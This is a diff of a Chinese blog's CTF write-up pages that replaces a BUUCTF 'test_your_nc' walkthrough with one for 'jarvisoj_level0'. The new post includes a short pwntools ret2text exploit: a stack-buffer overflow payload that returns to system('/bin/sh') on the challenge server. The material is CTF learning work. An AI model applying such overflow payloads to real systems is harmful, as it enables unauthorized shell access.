@@ -22,37 +22,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="T1 test_your_nc 2023-01-03WPBUUCTF pwn第一题">
+    <meta name="description" content="Week4 T1  jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text">
 <meta property="og:type" content="article">
-<meta property="og:title" content="week1 T1">
-<meta property="og:url" content="http://lmarch2.github.com/posts/5331bd59/index.html">
+<meta property="og:title" content="week4 T1">
+<meta property="og:url" content="http://lmarch2.github.com/posts/64ef4d6b/index.html">
 <meta property="og:site_name" content="lmarch2&#39;blog">
-<meta property="og:description" content="T1 test_your_nc 2023-01-03WPBUUCTF pwn第一题">
+<meta property="og:description" content="Week4 T1  jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp">
-<meta property="og:image" content="https://pic4.zhimg.com/v2-fbe627c7dd17761ef3bc56360d884f27_r.jpg">
-<meta property="og:image" content="https://pic1.zhimg.com/80/v2-84f08756aa27af34ed8fa47762094234_1440w.webp">
-<meta property="og:image" content="https://pic2.zhimg.com/80/v2-06f1ca937f2820c16be174944ebde851_1440w.webp">
-<meta property="og:image" content="https://pic4.zhimg.com/80/v2-d117911f69f0b5cdc99a9a7c5352489b_1440w.webp">
-<meta property="og:image" content="https://pic2.zhimg.com/80/v2-c7068e97c98c8f0dc5a292df9ab746cd_1440w.webp">
-<meta property="og:image" content="https://pic4.zhimg.com/80/v2-39e1446cefe516e40009a8526e953467_1440w.webp">
-<meta property="article:published_time" content="2023-01-13T12:15:14.000Z">
-<meta property="article:modified_time" content="2023-01-13T13:37:37.508Z">
+<meta property="article:published_time" content="2023-01-20T15:36:57.000Z">
+<meta property="article:modified_time" content="2023-01-20T16:26:55.129Z">
 <meta property="article:author" content="lmarch2">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="ctf BUUCTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp">
 
 
-<link rel="canonical" href="http://lmarch2.github.com/posts/5331bd59/">
+<link rel="canonical" href="http://lmarch2.github.com/posts/64ef4d6b/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/5331bd59/","path":"posts/5331bd59/","title":"week1 T1"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/64ef4d6b/","path":"posts/64ef4d6b/","title":"week4 T1"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>week1 T1 | lmarch2'blog</title>
+<title>week4 T1 | lmarch2'blog</title>
   
 
 
@@ -152,7 +143,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T1-test-your-nc"><span class="nav-text">T1 test_your_nc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%94%A8checksec%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">一、用checksec检测文件保护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%89%93%E5%BC%80IDA"><span class="nav-text">二、打开IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E7%BB%93%E5%90%88%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA%E5%8F%AF%E7%9F%A5%E7%9B%B4%E6%8E%A5nc"><span class="nav-text">三、结合题目提示可知直接nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E4%B8%80%E4%BA%9B%E7%96%91%E9%97%AE"><span class="nav-text">四、一些疑问</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week4-T1-jarvisoj-level0"><span class="nav-text">Week4 T1  jarvisoj_level0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -299,7 +290,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/5331bd59/">
+    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/64ef4d6b/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-ffbdad5d2f9183a625a6a112a4f96b02_1440w.webp">
@@ -312,12 +303,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="week1 T1 | lmarch2'blog">
+      <meta itemprop="name" content="week4 T1 | lmarch2'blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          week1 T1
+          week4 T1
         </h1>
 
         <div class="post-meta-container">
@@ -327,9 +318,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-01-13 20:15:14 / 修改时间：21:37:37" itemprop="dateCreated datePublished" datetime="2023-01-13T20:15:14+08:00">2023-01-13</time>
+      <time title="创建时间：2023-01-20 23:36:57" itemprop="dateCreated datePublished" datetime="2023-01-20T23:36:57+08:00">2023-01-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-01-21 00:26:55" itemprop="dateModified" datetime="2023-01-21T00:26:55+08:00">2023-01-21</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -337,7 +334,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+          <a href="/categories/WP/" itemprop="url" rel="index"><span itemprop="name">WP</span></a>
         </span>
     </span>
 
@@ -355,7 +352,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>587</span>
+      <span>380</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -373,16 +370,13 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T1-test-your-nc"><a href="#T1-test-your-nc" class="headerlink" title="T1 test_your_nc"></a>T1 test_your_nc</h2><blockquote>
-<p>2023-01-03WP<br>BUUCTF pwn第一题</p>
-</blockquote>
+        <h2 id="Week4-T1-jarvisoj-level0"><a href="#Week4-T1-jarvisoj-level0" class="headerlink" title="Week4 T1  jarvisoj_level0"></a>Week4 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn 第六题<br>考点： 简单栈溢出&#x2F;基本rop ret2text</p>
 <span id="more"></span>
 
-<h3 id="一、用checksec检测文件保护机制"><a href="#一、用checksec检测文件保护机制" class="headerlink" title="一、用checksec检测文件保护机制"></a>一、用checksec检测文件保护机制</h3><p>下载文件，checksec得知已开启NX保护<br><img data-src="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp"><br>（奇怪的是checksec没有给出文件位数，后来还是file了一下得到是64位）</p>
-<h3 id="二、打开IDA"><a href="#二、打开IDA" class="headerlink" title="二、打开IDA"></a>二、打开IDA</h3><p>将文件扔到IDA中，按下shift+f12,打开string window，发现&#x2F;bin&#x2F;sh<br><img data-src="https://pic4.zhimg.com/v2-fbe627c7dd17761ef3bc56360d884f27_r.jpg"><br>双击&#x2F;bin&#x2F;sh，点击command，交叉引用快捷键X，发现地址在main函数里<br><img data-src="https://pic1.zhimg.com/80/v2-84f08756aa27af34ed8fa47762094234_1440w.webp"><br>按下f5确定main函数就是一个简单地调用了&#x2F;bin&#x2F;sh的system函数<br><img data-src="https://pic2.zhimg.com/80/v2-06f1ca937f2820c16be174944ebde851_1440w.webp"><br><del>(其实感觉前两步就这题来说没必要……但是看一篇博客说拿到文件先checksec一下再IDA一下于是想试一下……)</del></p>
-<h3 id="三、结合题目提示可知直接nc"><a href="#三、结合题目提示可知直接nc" class="headerlink" title="三、结合题目提示可知直接nc"></a>三、结合题目提示可知直接nc</h3><p><del>（这个地方一开始报错，仔细一看发现ctrl cv过来的端口那里还有一个：得把冒号去掉……）</del><br>ls列出文件目录<br><img data-src="https://pic4.zhimg.com/80/v2-d117911f69f0b5cdc99a9a7c5352489b_1440w.webp"><br>发现flag，用cat（concatenate，命令用于连接文件并打印到标准输出设备上）抓取flag得<br><img data-src="https://pic2.zhimg.com/80/v2-c7068e97c98c8f0dc5a292df9ab746cd_1440w.webp"></p>
-<h3 id="四、一些疑问"><a href="#四、一些疑问" class="headerlink" title="四、一些疑问"></a>四、一些疑问</h3><p>1.为什么我的checksec只能横着一排显示过去？打开文件时为什么只能用checksec –file&#x3D;而不能checksec file?（网上查找过资料没有解决方法）<br>2.用peda自带的checksec为什么用两种格式打开文件会出现不同的结果呢？<br><img data-src="https://pic4.zhimg.com/80/v2-39e1446cefe516e40009a8526e953467_1440w.webp"></p>
-
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 64-bit，开NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80<br>又找到有system(“&#x2F;bin&#x2F;sh”)<br>返回其地址</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,29175)</span><br><span class="line">ret_arr = 0X40059A</span><br><span class="line">payload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -409,7 +403,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://lmarch2.github.com/posts/5331bd59/" title="week1 T1">http://lmarch2.github.com/posts/5331bd59/</a>
+      <a href="http://lmarch2.github.com/posts/64ef4d6b/" title="week4 T1">http://lmarch2.github.com/posts/64ef4d6b/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -420,8 +414,7 @@
           <div class="post-tags">
 
  <div class="post-tags">
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-              <a href="/tags/BUUCTF/" rel="tag"><i class="fa fa-tag"></i> BUUCTF</a>
+              <a href="/tags/ctf-BUUCTF/" rel="tag"><i class="fa fa-tag"></i> ctf BUUCTF</a>
           </div>
           <script type="text/javascript">
             var tagsall=document.getElementsByClassName("post-tags")
@@ -480,81 +473,18 @@
             </script>
 
 
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-
- <div class="post-tags">
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-              <a href="/tags/BUUCTF/" rel="tag"><i class="fa fa-tag"></i> BUUCTF</a>
-          </div>
-          <script type="text/javascript">
-            var tagsall=document.getElementsByClassName("post-tags")
-            for (var i = tagsall.length - 1; i >= 0; i--){
-                var tags=tagsall[i].getElementsByTagName("a");
-                for (var j = tags.length - 1; j >= 0; j--) {
-                    var golden_ratio = 0.618033988749895;
-                    var s = 0.5;
-                    var v = 0.999;
-                    var h = golden_ratio + Math.random()*0.8 - 0.5;
-                    var h_i = parseInt(h * 6);
-                    var f = h * 6 - h_i;
-                    var p = v * (1 - s);
-                    var q = v * (1 - f * s);
-                    var t = v * (1 - (1 - f) * s);
-                    var r, g, b;
-                    switch (h_i) {
-                        case 0:
-                            r = v;
-                            g = t;
-                            b = p;
-                            break;
-                        case 1:
-                            r = q;
-                            g = v;
-                            b = p;
-                            break;
-                        case 2:
-                            r = p;
-                            g = v;
-                            b = t;
-                            break;
-                        case 3 :
-                            r = p;
-                            g = q;
-                            b = v;
-                            break;
-                        case 4:
-                            r = t;
-                            g = p;
-                            b = v;
-                            break;
-                        case 5:
-                            r = v;
-                            g = p;
-                            b = q;
-                            break;
-                        default:
-                            r = 1;
-                            g = 1;
-                            b = 1;
-                      }
-                    tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
-                }
-            }                        
-            </script>
-
-
-              <a href="/tags/BUUCTF/" rel="tag"><i class="fa fa-tag"></i> BUUCTF</a>
+              <a href="/tags/ctf-BUUCTF/" rel="tag"><i class="fa fa-tag"></i> ctf BUUCTF</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
+                <a href="/posts/fe55b1cb/" rel="prev" title="week3 T5">
+                  <i class="fa fa-chevron-left"></i> week3 T5
+                </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/ca38ece3/" rel="next" title="week1 T2">
-                  week1 T2 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
